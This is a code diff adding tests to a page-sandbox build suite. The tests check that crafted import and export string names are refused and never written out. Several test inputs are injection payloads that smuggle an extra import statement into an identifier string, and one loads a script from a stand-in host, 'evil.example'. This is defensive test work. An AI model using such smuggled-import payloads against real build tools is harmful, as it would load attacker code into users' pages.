@@ -77,6 +77,41 @@ describe("page sandbox", { timeout: 60_000 }, () => {
     ]);
   });
 
+  it.each([
+    [
+      "a re-export under a string name that would write an import",
+      'export { InboxIcon as "y}from\\"./a.js\\";import\\"https://evil.example/x.js\\";export{default as z" } from "lucide-react";',
+    ],
+    [
+      "a re-export under a string name with braces, a newline and a comment",
+      'export { InboxIcon as "}\\n/* x */ import \\"evil\\"; export {" } from "lucide-react";',
+    ],
+    [
+      "a re-export of a string name",
+      'export { "InboxIcon" as Inbox } from "lucide-react";',
+    ],
+    [
+      "an import of a string name",
+      'import { "InboxIcon" as Inbox } from "lucide-react";\nvoid Inbox;',
+    ],
+    [
+      "an import of a string name with quotes and a semicolon",
+      'import { "InboxIcon\\";import \\"evil" as Inbox } from "lucide-react";\nvoid Inbox;',
+    ],
+  ])("refuses icons under %s, writing nothing of it", async (_case, code) => {
+    const built = await buildPages(env, page(code), "app-test");
+    const written = built.ok ? Object.values(built.modules).join("\n") : "";
+    expect({
+      ok: built.ok,
+      evil: written.includes("evil"),
+      refused: built.ok
+        ? []
+        : built.diagnostics
+            .filter(({ severity }) => severity === "error")
+            .map(({ rule }) => rule),
+    }).toStrictEqual({ ok: false, evil: false, refused: ["imports"] });
+  });
+
   it("says import() belongs at the top of the file", async () => {
     await expect(
       summaries({
